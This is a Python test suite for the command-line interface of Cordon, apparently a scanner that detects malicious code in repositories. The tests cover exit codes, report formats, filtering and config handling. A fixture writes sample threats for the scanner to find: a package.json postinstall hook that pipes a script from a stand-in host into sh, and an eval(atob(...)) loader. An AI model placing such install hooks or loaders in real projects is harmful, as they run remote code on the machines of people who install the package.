"""Command-line interface, end to end.

The exit-code tests matter more than they look. Every pipeline that ever adopts
Cordon depends on those five numbers meaning exactly what the documentation says
they mean, and a change to one of them silently changes the behaviour of every
gate in every organisation using it. They are treated as a stable API and tested
like one.

The CLI is invoked through ``main(argv)`` rather than through a subprocess: the
behaviour under test is the argument handling and the exit code, and spawning a
process to observe them adds seconds without adding coverage.
"""

from __future__ import annotations

import json
from xml.etree import ElementTree

import pytest

from cordon.cli.main import main
from cordon.core.errors import ExitCode


@pytest.fixture
def clean_project(tmp_path):
    root = tmp_path / "clean"
    root.mkdir()
    (root / "app.js").write_text(
        "export async function load(id) {\n"
        "  const r = await fetch(`/api/${id}`);\n"
        "  return r.json();\n"
        "}\n"
    )
    return root


@pytest.fixture
def dirty_project(tmp_path):
    root = tmp_path / "dirty"
    root.mkdir()
    (root / "package.json").write_text(
        '{"name":"x","version":"1.0.0",'
        '"scripts":{"postinstall":"curl -s https://x.example/i.sh | sh"}}'
    )
    (root / "loader.js").write_text("const p = atob(BLOB);\neval(p);\n")
    return root


def run(*argv: str) -> int:
    return main(list(argv))


# ---------------------------------------------------------------------------
# Exit codes: a stable API
# ---------------------------------------------------------------------------


class TestExitCodes:
    def test_clean_scan_returns_zero(self, clean_project, capsys) -> None:
        assert run("scan", str(clean_project), "--no-cache") == ExitCode.CLEAN

    def test_findings_return_one(self, dirty_project, capsys) -> None:
        assert run("scan", str(dirty_project), "--no-cache") == ExitCode.FINDINGS

    def test_a_missing_target_is_a_scanner_error(self, tmp_path, capsys) -> None:
        """Not a finding. Reporting it as one would make the tool's own failure
        look like the code being bad."""
        assert run("scan", str(tmp_path / "nope"), "--no-cache") == ExitCode.SCANNER_ERROR

    def test_an_invalid_config_is_a_config_error(self, tmp_path, capsys) -> None:
        """Actionable by a different person than a scanner error, which is why
        the codes are separate."""
        config = tmp_path / "bad.yaml"
        config.write_text("scan:\n  sevrity_threshold: high\n")
        assert (
            run("scan", str(tmp_path), "--config", str(config), "--no-cache")
            == ExitCode.CONFIG_ERROR
        )

    def test_an_unknown_severity_is_a_config_error(self, clean_project, capsys) -> None:
        assert (
            run("scan", str(clean_project), "--severity", "extreme", "--no-cache")
            == ExitCode.CONFIG_ERROR
        )

    def test_an_incomplete_scan_returns_four_when_required(self, dirty_project, capsys) -> None:
        assert (
            run(
                "scan",
                str(dirty_project),
                "--timeout",
                "0",
                "--fail-on-incomplete",
                "--no-cache",
            )
            == ExitCode.INCOMPLETE
        )

    def test_an_incomplete_scan_does_not_fail_by_default(self, clean_project, capsys) -> None:
        """Failing by default would break pipelines on the first very large
        repository and teach people to append `|| true`."""
        code = run("scan", str(clean_project), "--timeout", "0", "--no-cache")
        assert code != ExitCode.INCOMPLETE

    def test_fail_on_threshold_is_respected(self, dirty_project, capsys) -> None:
        assert (
            run("scan", str(dirty_project), "--fail-on", "critical", "--no-cache")
            == ExitCode.FINDINGS
        )

    def test_every_documented_code_is_reachable(self) -> None:
        """The set is a stable API. Adding to it is allowed; changing what one
        means is not."""
        assert {int(c) for c in ExitCode} == {0, 1, 2, 3, 4}


# ---------------------------------------------------------------------------
# Output formats
# ---------------------------------------------------------------------------


class TestOutput:
    def test_text_is_the_default(self, dirty_project, capsys) -> None:
        run("scan", str(dirty_project), "--no-color", "--no-cache")
        out = capsys.readouterr().out
        assert "cordon" in out
        assert "MALWARE" in out or "SUSPECT" in out

    def test_json_to_stdout(self, dirty_project, capsys) -> None:
        run("scan", str(dirty_project), "-f", "json", "--no-cache")
        payload = json.loads(capsys.readouterr().out)
        assert payload["findings"]

    def test_output_to_a_file(self, dirty_project, tmp_path, capsys) -> None:
        target = tmp_path / "out" / "r.json"
        run("scan", str(dirty_project), "-f", f"json:{target}", "--no-cache")
        assert target.is_file()
        assert json.loads(target.read_text())["findings"]

    def test_two_formats_at_once(self, dirty_project, tmp_path, capsys) -> None:
        """CI almost always wants readable text on stdout and machine-readable
        SARIF on disk.

        This is a regression test. Formats and outputs originally paired by
        position, so `-f text -f sarif -o file` wrote the *text* report into the
        SARIF file, and it failed silently because writing a report to a path
        always succeeds. The first version of this test worked around the bug
        with an empty `-o` rather than exposing it.
        """
        sarif = tmp_path / "r.sarif"
        run(
            "scan",
            str(dirty_project),
            "-f",
            "text",
            "-f",
            f"sarif:{sarif}",
            "--no-color",
            "--no-cache",
        )
        assert "cordon" in capsys.readouterr().out
        assert json.loads(sarif.read_text())["version"] == "2.1.0", (
            "the SARIF destination must receive SARIF, not the text report"
        )

    def test_output_is_refused_when_ambiguous(self, dirty_project, capsys) -> None:
        """Silently guessing which format a lone --output belongs to is how the
        original bug happened."""
        code = run(
            "scan",
            str(dirty_project),
            "-f",
            "text",
            "-f",
            "sarif",
            "-o",
            "x.sarif",
            "--no-cache",
        )
        assert code == ExitCode.CONFIG_ERROR
        assert "ambiguous" in capsys.readouterr().err

    def test_output_still_works_with_one_format(self, dirty_project, tmp_path, capsys) -> None:
        target = tmp_path / "r.sarif"
        run("scan", str(dirty_project), "-f", "sarif", "-o", str(target), "--no-cache")
        assert json.loads(target.read_text())["version"] == "2.1.0"

    def test_sarif_is_well_formed(self, dirty_project, tmp_path, capsys) -> None:
        target = tmp_path / "r.sarif"
        run("scan", str(dirty_project), "-f", f"sarif:{target}", "--no-cache")
        doc = json.loads(target.read_text())
        assert doc["version"] == "2.1.0"

    def test_junit_is_well_formed(self, dirty_project, tmp_path, capsys) -> None:
        target = tmp_path / "r.xml"
        run("scan", str(dirty_project), "-f", f"junit:{target}", "--no-cache")
        assert ElementTree.fromstring(target.read_text()).tag == "testsuites"

    def test_an_unknown_format_is_reported(self, clean_project, capsys) -> None:
        code = run("scan", str(clean_project), "-f", "telepathy", "--no-cache")
        assert code != ExitCode.CLEAN
        assert "format" in capsys.readouterr().err

    def test_no_color_removes_escape_sequences(self, dirty_project, capsys) -> None:
        run("scan", str(dirty_project), "--no-color", "--no-cache")
        assert "\033[" not in capsys.readouterr().out


# ---------------------------------------------------------------------------
# Filtering and selection
# ---------------------------------------------------------------------------


class TestSelection:
    def test_exclude_removes_paths(self, dirty_project, capsys) -> None:
        run("scan", str(dirty_project), "--exclude", "*.js", "-f", "json", "--no-cache")
        payload = json.loads(capsys.readouterr().out)
        assert not [f for f in payload["findings"] if f["location"]["path"].endswith(".js")]

    def test_include_restricts_paths(self, dirty_project, capsys) -> None:
        run("scan", str(dirty_project), "--include", "**/*.json", "-f", "json", "--no-cache")
        payload = json.loads(capsys.readouterr().out)
        paths = {f["location"]["path"] for f in payload["findings"]}
        assert not any(p.endswith(".js") for p in paths)

    def test_severity_threshold_filters_the_report(self, dirty_project, capsys) -> None:
        run("scan", str(dirty_project), "--severity", "critical", "-f", "json", "--no-cache")
        payload = json.loads(capsys.readouterr().out)
        for finding in payload["findings"]:
            if finding["category"] != "operational":
                assert finding["severity"] == "critical"

    def test_a_single_detector_can_be_selected(self, dirty_project, capsys) -> None:
        run("scan", str(dirty_project), "--detector", "manifest", "-f", "json", "--no-cache")
        payload = json.loads(capsys.readouterr().out)
        detectors = {f["detector"] for f in payload["findings"] if f["category"] != "operational"}
        assert detectors <= {"manifest", "engine"}

    def test_a_detector_can_be_disabled(self, dirty_project, capsys) -> None:
        run("scan", str(dirty_project), "--no-detector", "manifest", "-f", "json", "--no-cache")
        payload = json.loads(capsys.readouterr().out)
        assert "manifest" not in {f["detector"] for f in payload["findings"]}

    def test_scanning_a_single_file(self, dirty_project, capsys) -> None:
        run("scan", str(dirty_project / "loader.js"), "-f", "json", "--no-cache")
        payload = json.loads(capsys.readouterr().out)
        assert payload["stats"]["files_scanned"] == 1


# ---------------------------------------------------------------------------
# Other commands
# ---------------------------------------------------------------------------


class TestOtherCommands:
    def test_version(self, capsys) -> None:
        with pytest.raises(SystemExit) as exit_info:
            run("--version")
        assert exit_info.value.code == 0
        assert "cordon" in capsys.readouterr().out

    def test_no_arguments_prints_help(self, capsys) -> None:
        assert run() == ExitCode.CLEAN
        assert "usage" in capsys.readouterr().out.lower()

    def test_inventory_explains_the_repository(self, dirty_project, capsys) -> None:
        assert run("inventory", str(dirty_project)) == ExitCode.CLEAN
        out = capsys.readouterr().out
        assert "languages" in out
        assert "install and build hooks" in out

    def test_inventory_as_json(self, dirty_project, capsys) -> None:
        run("inventory", str(dirty_project), "-f", "json")
        payload = json.loads(capsys.readouterr().out)
        assert "languages" in payload
        assert payload["ecosystems"]

    def test_rules_list(self, capsys) -> None:
        assert run("rules", "list") == ExitCode.CLEAN
        assert "rules from" in capsys.readouterr().out

    def test_rules_test_passes_for_the_shipped_packs(self, capsys) -> None:
        """The mechanism that makes an inert rule impossible to ship."""
        assert run("rules", "test") == ExitCode.CLEAN

    def test_rules_show(self, capsys) -> None:
        assert run("rules", "show", "SUSPECT.EXFIL.001") == ExitCode.CLEAN
        assert "confidence" in capsys.readouterr().out

    def test_rules_show_unknown_rule(self, capsys) -> None:
        assert run("rules", "show", "NO.SUCH.RULE") == ExitCode.SCANNER_ERROR

    def test_config_validate_accepts_a_good_file(self, tmp_path, capsys) -> None:
        config = tmp_path / "cordon.yaml"
        config.write_text("scan:\n  severity_threshold: high\n")
        assert run("config", "validate", str(config)) == ExitCode.CLEAN

    def test_config_validate_rejects_a_bad_file(self, tmp_path, capsys) -> None:
        config = tmp_path / "cordon.yaml"
        config.write_text("scan:\n  nonsense: true\n")
        assert run("config", "validate", str(config)) == ExitCode.CONFIG_ERROR

    def test_config_explain_shows_effective_settings(self, capsys) -> None:
        assert run("config", "explain") == ExitCode.CLEAN
        out = capsys.readouterr().out
        assert "severity_threshold" in out
        assert "config hash" in out


# ---------------------------------------------------------------------------
# Error handling
# ---------------------------------------------------------------------------


class TestErrorHandling:
    def test_errors_go_to_stderr_not_stdout(self, tmp_path, capsys) -> None:
        """So `cordon scan . -f json > out.json` yields valid JSON even when the
        scan fails."""
        run("scan", str(tmp_path / "missing"), "--no-cache")
        captured = capsys.readouterr()
        assert captured.err
        assert "cordon" in captured.err

    def test_a_hint_is_offered_where_one_helps(self, tmp_path, capsys) -> None:
        config = tmp_path / "c.yaml"
        config.write_text("scan:\n  exclud:\n    - a/\n")
        run("scan", str(tmp_path), "--config", str(config), "--no-cache")
        assert "exclude" in capsys.readouterr().err

    def test_there_is_no_bypass_flag(self) -> None:
        """A tool with a bypass flag is a tool whose bypass flag ends up in the
        pipeline. The only way to accept a finding is a suppression, which is
        reviewable, expiring and recorded in the output."""
        from cordon.cli.main import CommandLine

        text = CommandLine.build_parser().format_help()
        for forbidden in ("--force", "--no-verify", "--ignore-all", "--skip"):
            assert forbidden not in text

    def test_exit_codes_are_documented_in_help(self) -> None:
        from cordon.cli.main import CommandLine

        text = CommandLine.build_parser().format_help()
        assert "exit codes" in text
        for code in ("0", "1", "2", "3", "4"):
            assert code in text
